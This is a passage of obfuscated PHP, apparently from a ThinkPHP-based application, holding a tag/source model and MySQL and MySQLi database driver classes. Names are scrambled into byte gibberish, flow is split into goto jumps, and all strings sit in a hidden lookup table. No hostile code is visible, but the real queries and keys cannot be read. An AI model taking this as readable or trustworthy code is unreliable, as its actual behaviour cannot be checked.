array_find_by_field($a‚¼¿ƒ»š¼[$aÙ”Ç‡Êì•[367]], $aÙ”Ç‡Êì•[393], $dÆÅ³óó„š); goto AŸ†”„Û¶; d§‘Šñ—­§: } public function listSource($CéòÅÉ«•, $d’Û­–¥) { goto c±ğÉ’Ç¾“; c±ğÉ’Ç¾“: $BËâ…ˆàˆ° =& $_SERVER[æ§›¦ÌáØ]; if ($d’Û­–¥ && !is_array($d’Û­–¥)) { $d’Û­–¥ = array($d’Û­–¥); } $f“©ĞÜØ = $this->listData($CéòÅÉ«•); goto Dõ«„ğëÑ¤; Dõ«„ğëÑ¤: $C¡ˆ„Òê¬ê = array(); foreach ($f“©ĞÜØ as $d¯ö÷Ááæ) { $F‚šê½ƒ£ = $d¯ö÷Ááæ[$BËâ…ˆàˆ°[76]]; if (!$F‚šê½ƒ£) { continue; } if (!isset($C¡ˆ„Òê¬ê[$F‚šê½ƒ£])) { $C¡ˆ„Òê¬ê[$F‚šê½ƒ£] = array(); } $C¡ˆ„Òê¬ê[$F‚šê½ƒ£][] = $d¯ö÷Ááæ[$BËâ…ˆàˆ°[419]]; } $eæ–»ë’³ = array(); goto A÷öµ¹êçÒ; EÜ±¢ÀöË½: foreach ($eæ–»ë’³ as $F‚šê½ƒ£) { if (!in_array($F‚šê½ƒ£, $Eì¯Á£¹•’)) { $b©ŞÆĞ·‘Ô[] = $F‚šê½ƒ£; } } if ($b©ŞÆĞ·‘Ô) { $this->removeBySource($CéòÅÉ«•, $b©ŞÆĞ·‘Ô); } return $B°‘·­‡çà; goto Cª…¨åË«; DÀ²ğÊ¾Û: $B°‘·­‡çà = Model($BËâ…ˆàˆ°[1196])->listSource($CÍ©ÅŠØÆ); if (!$B°‘·­‡çà || count($eæ–»ë’³) == $B°‘·­‡çà[$BËâ…ˆàˆ°[364]][$BËâ…ˆàˆ°[365]]) { return $B°‘·­‡çà; } $b©ŞÆĞ·‘Ô = array(); goto C•âŞ„¼á; A÷öµ¹êçÒ: foreach ($C¡ˆ„Òê¬ê as $aÙ’ŠœÂÜÖ => $b°»öÃø±ğ) { $cé¬¿“á»– = !0; if (!$d’Û­–¥) { $eæ–»ë’³[] = $aÙ’ŠœÂÜÖ; continue; } foreach ($d’Û­–¥ as $Bëèåô¬œ») { if (!in_array($Bëèåô¬œ», $b°»öÃø±ğ)) { $cé¬¿“á»– = !1; break; } } if ($cé¬¿“á»–) { $eæ–»ë’³[] = $aÙ’ŠœÂÜÖ; } } if (!$eæ–»ë’³) { return array(); } $CÍ©ÅŠØÆ = array($BËâ…ˆàˆ°[410] => array($BËâ…ˆàˆ°[411], $eæ–»ë’³), $BËâ…ˆàˆ°[484] => $CéòÅÉ«•, $BËâ…ˆàˆ°[404] => SourceModel::TYPE_GROUP); goto DÀ²ğÊ¾Û; C•âŞ„¼á: $fÉÀØš”×¢ = array_to_keyvalue($B°‘·­‡çà[$BËâ…ˆàˆ°[75]], $BËâ…ˆàˆ°[33], $BËâ…ˆàˆ°[395]); $CëÏ‡’ƒÔ = array_to_keyvalue($B°‘·­‡çà[$BËâ…ˆàˆ°[74]], $BËâ…ˆàˆ°[33], $BËâ…ˆàˆ°[395]); $Eì¯Á£¹•’ = array_merge($CëÏ‡’ƒÔ, $fÉÀØš”×¢); goto EÜ±¢ÀöË½; Cª…¨åË«: } protected function listData($dÅ È·ÖÁÙ) { $eï§Ú­ßƒ =& $_SERVER[æ§›¦ÌáØ]; $aó÷Õ‘²Œ = array($eï§Ú­ßƒ[1511] => 0, $eï§Ú­ßƒ[463] => array($eï§Ú­ßƒ[1795], 0), $eï§Ú­ßƒ[415] => $eï§Ú­ßƒ[1796] . $dÅ È·ÖÁÙ); $få×º†ƒÓñ = $eï§Ú­ßƒ[1797]; $CŠù™Ûùœ‚ = $this->field($få×º†ƒÓñ)->where($aó÷Õ‘²Œ)->order($eï§Ú­ßƒ[1798])->select(); return $CŠù™Ûùœ‚ ? $CŠù™Ûùœ‚ : array(); } protected function addToTag($F¨ëÒñ½, $fâÎ˜”ŞÍ, $f¢³¤ñ÷Ÿ©) { $B„Ùçâ‡  =& $_SERVER[æ§›¦ÌáØ]; if (!$this->getByTagID($F¨ëÒñ½, $f¢³¤ñ÷Ÿ©) || !$fâÎ˜”ŞÍ) { return !1; } if (!Model($B„Ùçâ‡ [783])->pathInfo($fâÎ˜”ŞÍ)) { return !1; } $D„½Ú·ØéŒ = array($B„Ùçâ‡ [1511] => 0, $B„Ùçâ‡ [463] => $f¢³¤ñ÷Ÿ©, $B„Ùçâ‡ [414] => $fâÎ˜”ŞÍ, $B„Ùçâ‡ [415] => $B„Ùçâ‡ [1799] . $F¨ëÒñ½, $B„Ùçâ‡ [413] => $B„Ùçâ‡ [33], $B„Ùçâ‡ [1693] => 0); if ($this->where($D„½Ú·ØéŒ)->find()) { return !1; } return $this->add($D„½Ú·ØéŒ); } protected function removeFromTag($dùÓó¥“Ñò, $EèÇ÷“ÃÉ”, $aâÇ•Š¼ª ) { $F„¤¼‹À„™ =& $_SERVER[æ§›¦ÌáØ]; if (!$this->getByTagID($dùÓó¥“Ñò, $aâÇ•Š¼ª ) || !$EèÇ÷“ÃÉ”) { return !1; } if (is_array($EèÇ÷“ÃÉ”)) { $EèÇ÷“ÃÉ” = array($F„¤¼‹À„™[7], $EèÇ÷“ÃÉ”); } $aÊŞ«ØëÁŒ = array($F„¤¼‹À„™[1511] => 0, $F„¤¼‹À„™[463] => $aâÇ•Š¼ª , $F„¤¼‹À„™[415] => $F„¤¼‹À„™[1799] . $dùÓó¥“Ñò, $F„¤¼‹À„™[414] => $EèÇ÷“ÃÉ”); return $this->where($aÊŞ«ØëÁŒ)->delete(); } protected function removeByTag($AŒ¼·øŒğ¦, $EˆŠ©õ…å†) { $F†óïÌ’†Š =& $_SERVER[æ§›¦ÌáØ]; if (!$this->getByTagID($AŒ¼·øŒğ¦, $EˆŠ©õ…å†)) { return !1; } $A¬ÊÏçÇì† = array($F†óïÌ’†Š[1511] => 0, $F†óïÌ’†Š[463] => $EˆŠ©õ…å†, $F†óïÌ’†Š[415] => $F†óïÌ’†Š[1799] . $AŒ¼·øŒğ¦); return $this->where($A¬ÊÏçÇì†)->delete(); } protected function removeBySource($EÄ‚¿ğ‹Ÿ›, $d»µ¤³‹¥) { $fÕõĞÔ°“Ó =& $_SERVER[æ§›¦ÌáØ]; if (!$EÄ‚¿ğ‹Ÿ› || !$d»µ¤³‹¥) { return !1; } if (is_array($d»µ¤³‹¥)) { $d»µ¤³‹¥ = array($fÕõĞÔ°“Ó[7], $d»µ¤³‹¥); } $EÂÙËàÎ = array($fÕõĞÔ°“Ó[1511] => 0, $fÕõĞÔ°“Ó[414] => $d»µ¤³‹¥, $fÕõĞÔ°“Ó[463] => array($fÕõĞÔ°“Ó[962], 0), $fÕõĞÔ°“Ó[415] => $fÕõĞÔ°“Ó[1799] . $EÄ‚¿ğ‹Ÿ›); return $this->where($EÂÙËàÎ)->delete(); } } goto Fò˜é¬Ï…ğ; bÔ‚ªŒ´µå: class DbMysql extends Db { public function __construct($F¼™Ğ÷®¤ = '') { $dÍÊéãóÚó =& $_SERVER[æ§›¦ÌáØ]; if (!extension_loaded($dÍÊéãóÚó[752])) { think_exception(think_lang($dÍÊéãóÚó[10]) . $dÍÊéãóÚó[836]); } if (!empty($F¼™Ğ÷®¤)) { $this->config = $F¼™Ğ÷®¤; if (empty($this->config[$dÍÊéãóÚó[13]])) { $this->config[$dÍÊéãóÚó[13]] = $dÍÊéãóÚó[33]; } } } public function connect($F—½ˆÊ‘¥ä = '', $e²ëª¢ç§Ğ = 0, $A ÜÀ„š× = false) { $A ‰”ôÜÑˆ =& $_SERVER[æ§›¦ÌáØ]; if (!isset($this->linkID[$e²ëª¢ç§Ğ])) { goto aŸ•–˜©™¡; dÒ‚øÚŒàğ: if ($Cµä«è…°) { $this->linkID[$e²ëª¢ç§Ğ] = mysql_pconnect($EÂšŒ¢Ì¥„, $F—½ˆÊ‘¥ä[$A ‰”ôÜÑˆ[839]], $F—½ˆÊ‘¥ä[$A ‰”ôÜÑˆ[840]], 131072); } else { $this->linkID[$e²ëª¢ç§Ğ] = mysql_connect($EÂšŒ¢Ì¥„, $F—½ˆÊ‘¥ä[$A ‰”ôÜÑˆ[839]], $F—½ˆÊ‘¥ä[$A ‰”ôÜÑˆ[840]], !0, 131072); } if (!$this->linkID[$e²ëª¢ç§Ğ] || !empty($F—½ˆÊ‘¥ä[$A ‰”ôÜÑˆ[17]]) && !mysql_select_db($F—½ˆÊ‘¥ä[$A ‰”ôÜÑˆ[17]], $this->linkID[$e²ëª¢ç§Ğ])) { think_exception(mysql_error()); } $C¡Š´ÛªÜË = mysql_get_server_info($this->linkID[$e²ëª¢ç§Ğ]); goto aÀÓ®†Œê; aÀÓ®†Œê: mysql_query($A ‰”ôÜÑˆ[841] . think_config($A ‰”ôÜÑˆ[842]) . $A ‰”ôÜÑˆ[55], $this->linkID[$e²ëª¢ç§Ğ]); if ($C¡Š´ÛªÜË > $A ‰”ôÜÑˆ[843]) { mysql_query($A ‰”ôÜÑˆ[844], $this->linkID[$e²ëª¢ç§Ğ]); } $this->connected = !0; goto DŒÕÔëáØ¢; aŸ•–˜©™¡: if (empty($F—½ˆÊ‘¥ä)) { $F—½ˆÊ‘¥ä = $this->config; } $EÂšŒ¢Ì¥„ = $F—½ˆÊ‘¥ä[$A ‰”ôÜÑˆ[837]] . ($F—½ˆÊ‘¥ä[$A ‰”ôÜÑˆ[838]] ? "\x3a{$F—½ˆÊ‘¥ä[$A ‰”ôÜÑˆ[838]]}" : $A ‰”ôÜÑˆ[33]); $Cµä«è…° = !empty($F—½ˆÊ‘¥ä[$A ‰”ôÜÑˆ[13]][$A ‰”ôÜÑˆ[14]]) ? $F—½ˆÊ‘¥ä[$A ‰”ôÜÑˆ[13]][$A ‰”ôÜÑˆ[14]] : $this->pconnect; goto dÒ‚øÚŒàğ; DŒÕÔëáØ¢: if (1 != think_config($A ‰”ôÜÑˆ[18])) { unset($this->config); } goto AÂ¾©ªèñ; AÂ¾©ªèñ: } return $this->linkID[$e²ëª¢ç§Ğ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($EöŠ±¿¹áù) { goto A‚¥ãÛğ¶Ñ; aè´îšöí¤: if (!$this->_linkID) { return !1; } $this->queryStr = $EöŠ±¿¹áù; if ($this->queryID) { $this->free(); } goto bºìºÈò§ó; A‚¥ãÛğ¶Ñ: $Dáï›øÊÚ£ =& $_SERVER[æ§›¦ÌáØ]; if (0 === stripos($EöŠ±¿¹áù, $Dáï›øÊÚ£[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto aè´îšöí¤; bˆŠé‹¿êæ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto Féâ×³™°; bºìºÈò§ó: think_action_status($Dáï›øÊÚ£[19], 1); think_status($Dáï›øÊÚ£[20]); $this->queryID = mysql_query($EöŠ±¿¹áù, $this->_linkID); goto bˆŠé‹¿êæ; Féâ×³™°: } public function execute($D‘ğÈî»¨‰) { goto Bïõö‚¿©Ô; Bïõö‚¿©Ô: $cµàáŞ¯àí =& $_SERVER[æ§›¦ÌáØ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D’ö©ÃˆÖŒ; cëøíæÜÒÉ: if (!1 === $bÔ¦ôÔê) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto E÷Íï„¨©; fÆ£Ê›îº: think_status($cµàáŞ¯àí[20]); $bÔ¦ôÔê = mysql_query($D‘ğÈî»¨‰, $this->_linkID); $this->debug(); goto cëøíæÜÒÉ; D’ö©ÃˆÖŒ: $this->queryStr = $D‘ğÈî»¨‰; if ($this->queryID) { $this->free(); } think_action_status($cµàáŞ¯àí[21], 1); goto fÆ£Ê›îº; E÷Íï„¨©: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[æ§›¦ÌáØ][845], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $E¯í¨ôÇ×Ğ = mysql_query($_SERVER[æ§›¦ÌáØ][846], $this->_linkID); $this->transTimes = 0; if (!$E¯í¨ôÇ×Ğ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $aÃ­‘¬Ğù = mysql_query($_SERVER[æ§›¦ÌáØ][847], $this->_linkID); $this->transTimes = 0; if (!$aÃ­‘¬Ğù) { $this->error(); return !1; } } return !0; } private function getAll() { $b°ñø–Õ¨Æ = array(); if ($this->numRows > 0) { while ($b„à¬‰¤±Ğ = mysql_fetch_assoc($this->queryID)) { $b°ñø–Õ¨Æ[] = $b„à¬‰¤±Ğ; } mysql_data_seek($this->queryID, 0); } return $b°ñø–Õ¨Æ; } public function getFields($d¨ã§š¯Ã) { $Fä¿…Ì„Å =& $_SERVER[æ§›¦ÌáØ]; $Bˆø±¡ßÒ = $this->query($Fä¿…Ì„Å[848] . $this->parseKey($d¨ã§š¯Ã)); $B«ï°‡í®Ş = array(); if ($Bˆø±¡ßÒ) { foreach ($Bˆø±¡ßÒ as $D‹ ÉÒÀÚ» => $fªãÃùÃÕ¿) { $B«ï°‡í®Ş[$fªãÃùÃÕ¿[$Fä¿…Ì„Å[27]]] = array($Fä¿…Ì„Å[28] => $fªãÃùÃÕ¿[$Fä¿…Ì„Å[27]], $Fä¿…Ì„Å[29] => $fªãÃùÃÕ¿[$Fä¿…Ì„Å[30]], $Fä¿…Ì„Å[31] => (bool) (strtoupper($fªãÃùÃÕ¿[$Fä¿…Ì„Å[32]]) === $Fä¿…Ì„Å[849]), $Fä¿…Ì„Å[34] => $fªãÃùÃÕ¿[$Fä¿…Ì„Å[35]], $Fä¿…Ì„Å[36] => strtolower($fªãÃùÃÕ¿[$Fä¿…Ì„Å[37]]) == $Fä¿…Ì„Å[38], $Fä¿…Ì„Å[39] => strtolower($fªãÃùÃÕ¿[$Fä¿…Ì„Å[40]]) == $Fä¿…Ì„Å[41]); } } return $B«ï°‡í®Ş; } public function getTables($BŠ“¯áâ = '') { $b–åÄç¤˜‡ =& $_SERVER[æ§›¦ÌáØ]; if (!empty($BŠ“¯áâ)) { $c¡Æ‚„°ˆğ = $b–åÄç¤˜‡[850] . $BŠ“¯áâ . $b–åÄç¤˜‡[851]; } else { $c¡Æ‚„°ˆğ = $b–åÄç¤˜‡[852]; } $e¾¬Ò¦¨’ = $this->query($c¡Æ‚„°ˆğ); $eÑŠƒè©ĞÖ = array(); foreach ($e¾¬Ò¦¨’ as $cÎä¢¡Ğ½» => $bï„õ‘œ¹Ö) { $eÑŠƒè©ĞÖ[$cÎä¢¡Ğ½»] = current($bï„õ‘œ¹Ö); } return $eÑŠƒè©ĞÖ; } public function replace($A’Û×Ö†ÅÙ, $d·˜Ñ·¾µ = array()) { $aâÑ§ìÄÅ­ =& $_SERVER[æ§›¦ÌáØ]; foreach ($A’Û×Ö†ÅÙ as $cˆÒà³‘Œæ => $BğÎ¼ÈŠ¦š) { $fÃ¦¬ÕóÃ‰ = $this->parseValue($BğÎ¼ÈŠ¦š); if (is_scalar($fÃ¦¬ÕóÃ‰)) { $D‡íÇœ«Õ¯[] = $fÃ¦¬ÕóÃ‰; $FÂÀÂĞ¶ªä[] = $this->parseKey($cˆÒà³‘Œæ); } } $c•‡Ö¥ÚéÌ = $aâÑ§ìÄÅ­[853] . $this->parseTable($d·˜Ñ·¾µ[$aâÑ§ìÄÅ­[277]]) . $aâÑ§ìÄÅ­[854] . implode($aâÑ§ìÄÅ­[47], $FÂÀÂĞ¶ªä) . $aâÑ§ìÄÅ­[855] . implode($aâÑ§ìÄÅ­[47], $D‡íÇœ«Õ¯) . $aâÑ§ìÄÅ­[856]; return $this->execute($c•‡Ö¥ÚéÌ); } public function insertAll($F·ÌùŸ¨³, $aÙÔœ»ëÒ = array(), $Dó´„‰ï•‡ = false) { goto fŞÒùùˆ; AéèÄ˜Åñ: $E÷¦Óùº = array(); foreach ($F·ÌùŸ¨³ as $bÜÅØå¥Óª) { $AøØò¡àŞÂ = array(); foreach ($bÜÅØå¥Óª as $a–Û£İ®İ => $Fˆ¬Ã‹ä……) { $Fˆ¬Ã‹ä…… = $this->parseValue($Fˆ¬Ã‹ä……); if (is_scalar($Fˆ¬Ã‹ä……)) { $AøØò¡àŞÂ[] = $Fˆ¬Ã‹ä……; } } $E÷¦Óùº[] = $A¼ß¶ø‡Ÿñ[258] . implode($A¼ß¶ø‡Ÿñ[47], $AøØò¡àŞÂ) . $A¼ß¶ø‡Ÿñ[856]; } array_walk($DŒİ¨¢ô¼ñ, array($this, $A¼ß¶ø‡Ÿñ[857])); goto dáÅèÂ¤ôÄ; dáÅèÂ¤ôÄ: $a·æ˜‹áàÂ = ($Dó´„‰ï•‡ ? $A¼ß¶ø‡Ÿñ[858] : $A¼ß¶ø‡Ÿñ[859]) . $A¼ß¶ø‡Ÿñ[860] . $this->parseTable($aÙÔœ»ëÒ[$A¼ß¶ø‡Ÿñ[277]]) . $A¼ß¶ø‡Ÿñ[854] . implode($A¼ß¶ø‡Ÿñ[47], $DŒİ¨¢ô¼ñ) . $A¼ß¶ø‡Ÿñ[861] . implode($A¼ß¶ø‡Ÿñ[47], $E÷¦Óùº); return $this->execute($a·æ˜‹áàÂ); goto eˆ÷Ğ£ÀŒ­; fŞÒùùˆ: $A¼ß¶ø‡Ÿñ =& $_SERVER[æ§›¦ÌáØ]; if (!is_array($F·ÌùŸ¨³[0])) { return !1; } $DŒİ¨¢ô¼ñ = array_keys($F·ÌùŸ¨³[0]); goto AéèÄ˜Åñ; eˆ÷Ğ£ÀŒ­: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $E¢¾ÙÑ—¶ =& $_SERVER[æ§›¦ÌáØ]; $this->error = mysql_errno() . $E¢¾ÙÑ—¶[4] . mysql_error($this->_linkID); if ($E¢¾ÙÑ—¶[33] != $this->queryStr) { $this->error .= LNG($E¢¾ÙÑ—¶[45]) . $this->queryStr; } think_trace($this->error, $E¢¾ÙÑ—¶[33], $E¢¾ÙÑ—¶[46]); return $this->error; } public function escapeString($E±Ï´·Úß) { if ($this->_linkID) { return mysql_real_escape_string($E±Ï´·Úß, $this->_linkID); } else { return mysql_escape_string($E±Ï´·Úß); } } public function parseKey(&$bÁÀˆ™ŠğÇ, $aÙ×Ö¼ó›† = true) { $AÏÎ¥Ï­¥õ =& $_SERVER[æ§›¦ÌáØ]; if ($aÙ×Ö¼ó›†) { $bÁÀˆ™ŠğÇ = $this->parseKeyCheck($bÁÀˆ™ŠğÇ); } if ($bÁÀˆ™ŠğÇ != $AÏÎ¥Ï­¥õ[182] && !preg_match($AÏÎ¥Ï­¥õ[862], $bÁÀˆ™ŠğÇ)) { $bÁÀˆ™ŠğÇ = $AÏÎ¥Ï­¥õ[382] . trim($bÁÀˆ™ŠğÇ, $AÏÎ¥Ï­¥õ[382]) . $AÏÎ¥Ï­¥õ[382]; } return $bÁÀˆ™ŠğÇ; } } class DbMysqli extends Db { public function __construct($B‘á‰¨ÕŒˆ = '') { $B©†ŠÙ‹À =& $_SERVER[æ§›¦ÌáØ]; if (!extension_loaded($B©†ŠÙ‹À[751])) { think_exception(think_lang($B©†ŠÙ‹À[10]) . $B©†ŠÙ‹À[863]); } if (!empty($B‘á‰¨ÕŒˆ)) { $this->config = $B‘á‰¨ÕŒˆ; if (empty($this->config[$B©†ŠÙ‹À[13]])) { $this->config[$B©†ŠÙ‹À[13]] = $B©†ŠÙ‹À[33]; } } } public function connect($bªö–ğÀ‘Í = '', $Eéø±šé¤† = 0) { $fìŒÕ¾“‡† =& $_SERVER[æ§›¦ÌáØ]; if (!isset($this->linkID[$Eéø±šé¤†])) { goto B˜Å‘º´™°; aŠ¨š° ¬›: $this->connected = !0; if (1 != think_config($fìŒÕ¾“‡†[18])) { unset($this->config); } goto e±‘š«ª…‡; C—ÒšîŞôÚ: $BÈˆøÃƒ¶‘ = $this->linkID[$Eéø±šé¤†]->server_version; $this->linkID[$Eéø±šé¤†]->query($fìŒÕ¾“‡†[841] . think_config($fìŒÕ¾“‡†[842]) . $fìŒÕ¾“‡†[55]); if ($BÈˆøÃƒ¶‘ > $fìŒÕ¾“‡†[843]) { $this->linkID[$Eéø±šé¤†]->query($fìŒÕ¾“‡†[844]); } goto aŠ¨š° ¬›; B˜Å‘º´™°: if (empty($bªö–ğÀ‘Í)) { $bªö–ğÀ‘Í = $this->config; } $this->linkID[$Eéø±šé¤†] = new mysqli($bªö–ğÀ‘Í[$fìŒÕ¾“‡†[837]], $bªö–ğÀ‘Í[$fìŒÕ¾“‡†[839]], $bªö–ğÀ‘Í[$fìŒÕ¾“‡†[840]], $bªö–ğÀ‘Í[$fìŒÕ¾“‡†[17]], $bªö–ğÀ‘Í[$fìŒÕ¾“‡†[838]] ? intval($bªö–ğÀ‘Í[$fìŒÕ¾“‡†[838]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto C—ÒšîŞôÚ; e±‘š«ª…‡: } return $this->linkID[$Eéø±šé¤†]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($d¼ğ‹»Õ¿¶) { goto BÑ’§—¦š•; BÑ’§—¦š•: $Aà²Ñ‚äØë =& $_SERVER[æ§›¦ÌáØ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bĞ³ôëÈò¤; c¿ÃÂÜ¥ºò: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto E™Ì¾‡õ–Ş; e¬¥İ¨‚÷©: think_status($Aà²Ñ‚äØë[20]); $this->queryID = $this->_linkID->query($d¼ğ‹»Õ¿¶); if ($this->_linkID->more_results()) { while (($C¼’ôĞ‡Š­ = $this->_linkID->next_result()) != NULL) { $C¼’ôĞ‡Š­->free_result(); } } goto c¿ÃÂÜ¥ºò; bĞ³ôëÈò¤: $this->queryStr = $d¼ğ‹»Õ¿¶; if ($this->queryID) { $this->free(); } think_action_status($Aà²Ñ‚äØë[19], 1); goto e¬¥İ¨‚÷©; E™Ì¾‡õ–Ş: } public function execute($Cƒ¼„«ùĞŸ) { goto f£‰Õì„¤ ; c±ÖĞ’¦·: if (!1 === $BŒíÄ¦ô‡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto CÍª‹Ñ¥æ; dÍª½òè„Ç: $this->queryStr = $Cƒ¼„«ùĞŸ; if ($this->queryID) { $this->free(); } think_action_status($Bæåô×‹®±[21], 1); goto dµ‡Œ‚§ª; f£‰Õì„¤ : $Bæåô×‹®± =& $_SERVER[æ§›¦ÌáØ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto dÍª½òè„Ç; dµ‡Œ‚§ª: think_status($Bæåô×‹®±[20]); $BŒíÄ¦ô‡ = $this->_linkID->query($Cƒ¼„«ùĞŸ); $this->debug(); goto c±ÖĞ’¦·; CÍª‹Ñ¥æ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aŒ½³ôİÌâ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$aŒ½³ôİÌâ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $C‘ÁöŒÛ² = $this->_linkID->rollback(); $this->transTimes = 0; if (!$C‘ÁöŒÛ²) { $this->error(); return !1; } } return !0; } private function getAll() { $fâù Î‹Ğ° = array(); if ($this->numRows > 0) { for ($CŞ¬÷œ²¨Ú = 0; $CŞ¬÷œ²¨Ú < $this->numRows; $CŞ¬÷œ²¨Ú++) { $fâù Î‹Ğ°[$CŞ¬÷œ²¨Ú] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $fâù Î‹Ğ°; } public function getFields($DÖï…ÓÆ×È) { $f•Ÿ…ãÔ¡¨ =& $_SERVER[æ§›¦ÌáØ]; $D¼µ­Îã› = $this->query($f•Ÿ…ãÔ¡¨[848] . $this->parseKey($DÖï…ÓÆ×È)); $e¬¯‘‘•î³ = array(); if ($D¼µ­Îã›) { foreach ($D¼µ­Îã› as $eÚ‚·„Æé¡ => $d‚÷Í‚™) { $e¬¯‘‘•î³[$d‚÷Í‚™[$f•Ÿ…ãÔ¡¨[27]]] = array($f•Ÿ…ãÔ¡¨[28] => $d‚÷Í‚™[$f•Ÿ…ãÔ¡¨[27]], $f•Ÿ…ãÔ¡¨[29] => $d‚÷Í‚™[$f•Ÿ…ãÔ¡¨[30]], $f•Ÿ…ãÔ¡¨[31] => (bool) ($d‚÷Í‚™[$f•Ÿ…ãÔ¡¨[32]] === $f•Ÿ…ãÔ¡¨[33]), $f•Ÿ…ãÔ¡¨[34] => $d‚÷Í‚™[$f•Ÿ…ãÔ¡¨[35]], $f•Ÿ…ãÔ¡¨[36] => strtolower($d‚÷Í‚™[$f•Ÿ…ãÔ¡¨[37]]) == $f•Ÿ…ãÔ¡¨[38], $f•Ÿ…ãÔ¡¨[39] => strtolower($d‚÷Í‚™[$f•Ÿ…ãÔ¡¨[40]]) == $f•Ÿ…ãÔ¡¨[41]); } } return $e¬¯‘‘•î³; } public function getTables($dİÄÌÀ‚Ùˆ = '') { $BÒˆ£¿Õùì =& $_SERVER[æ§›¦ÌáØ]; $c¥¯´ ·˜ = !empty($dİÄÌÀ‚Ùˆ) ? $BÒˆ£¿Õùì[850] . $dİÄÌÀ‚Ùˆ . $BÒˆ£¿Õùì[851] : $BÒˆ£¿Õùì[852]; $aÕŒ–¢Õğî = $this->query($c¥¯´ ·˜); $Cï››™¥ò¨ = array(); if ($aÕŒ–¢Õğî) { foreach ($aÕŒ–¢Õğî as $FğÁ¢‰ĞŸß => $A©òÜ¿î) { $Cï››™¥ò¨[$FğÁ¢‰ĞŸß] = current($A©òÜ¿î); } } return $Cï››™¥ò¨; } public function replace($cè‰¯š‚ÒÆ, $fñÈ¬¡”êÓ = array()) { $C³êŠÉÀª‰ =& $_SERVER[æ§›¦ÌáØ]; foreach ($cè‰¯š‚ÒÆ as $b†îğ±ïŞí => $C¤†©í½í) { $a¢„Õ¢±§§ = $this->parseValue($C¤†©í½í); if (is_scalar($a¢„Õ¢±§§)) { $Dù²Ú·šñ[] = $a¢„Õ¢±§§; $aØ³µî¶Ü[] = $this->parseKey($b†îğ±ïŞí); } } $B—ÔÈ÷â‚í = $C³êŠÉÀª‰[853] . $this->parseTable($fñÈ¬¡”êÓ[$C³êŠÉÀª‰[277]]) . $C³êŠÉÀª‰[854] . implode($C³êŠÉÀª‰[47], $aØ³µî¶Ü) . $C³êŠÉÀª‰[855] . implode($C³êŠÉÀª‰[47], $Dù²Ú·šñ) . $C³êŠÉÀª‰[856]; return $this->execute($B—ÔÈ÷â‚í); } public function insertAll($cïîø¢¯á, $FÅÃÍÄ¶§ª = array(), $EÂ–åºî„¾ = false) { goto f‘ª¸›„¢; e‰›ì×”®’: $eÙ¯ĞƒœÎ» = $EÂ–åºî„¾ ? $DÏˆÏÙƒÁ[858] : $DÏˆÏÙƒÁ[859]; $fËğš¾ùÓ = $eÙ¯ĞƒœÎ» . $DÏˆÏÙƒÁ[860] . $this->parseTable($FÅÃÍÄ¶§ª[$DÏˆÏÙƒÁ[277]]) . $DÏˆÏÙƒÁ[854] . implode($DÏˆÏÙƒÁ[47], $f«¥¿ƒªö¦) . $DÏˆÏÙƒÁ[861] . implode($DÏˆÏÙƒÁ[47], $Eƒ’—…½¶”); return $this->execute($fËğš¾ùÓ); goto F¼©ºìà‹; CÛ›–‰¶©Ø: $Eƒ’—…½¶” = array(); foreach ($cïîø¢¯á as $D˜‹êÎè—‡) { $BåœÖÍ¢à™ = array(); foreach ($D˜‹êÎè—‡ as $A·¬«³ßÔÒ => $eÈøÀ¼¦ä) { $eÈøÀ¼¦ä = $this->parseValue($eÈøÀ¼¦ä); if (is_scalar($eÈøÀ¼¦ä)) { $BåœÖÍ¢à™[] = $eÈøÀ¼¦ä; } } $Eƒ’—…½¶”[] = $DÏˆÏÙƒÁ[258] . implode($DÏˆÏÙƒÁ[47], $BåœÖÍ¢à™) . $DÏˆÏÙƒÁ[856]; } array_walk($f«¥¿ƒªö¦, array($this, $DÏˆÏÙƒÁ[857])); goto e‰›ì×”®’; f‘ª¸›„¢: $DÏˆÏÙƒÁ =& $_SERVER[æ§›¦ÌáØ]; if (!is_array($cïîø¢¯á[0])) { return !1; } $f«¥¿ƒªö¦ = array_keys($cïîø¢¯á[0]); goto CÛ›–‰¶©Ø; F¼©ºìà‹: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $E¡»Õ¡¨ğ‡ =& $_SERVER[æ§›¦ÌáØ]; $this->error = $this->_linkID->errno . $E¡»Õ¡¨ğ‡[4] . $this->_linkID->error; if ($E¡»Õ¡¨ğ‡[33] != $this->queryStr) { $this->error .= LNG($E¡»Õ¡¨ğ‡[45]) . $this->queryStr; } think_trace($this->error, $E¡»Õ¡¨ğ‡[33], $E¡»Õ¡¨ğ‡[46]); return $this->error; } public function escapeString($C¦Á”¦ø™) { if ($this->_linkID) { return $this->_linkID->real_escape_string($C¦Á”¦ø™); } else { return addslashes($C¦Á”¦ø™); } } public function parseKey(&$b°ğ§ÒÉ§¹, $A‘ÁĞêˆºÈ = true) { $C³¤Á®”¥Š =& 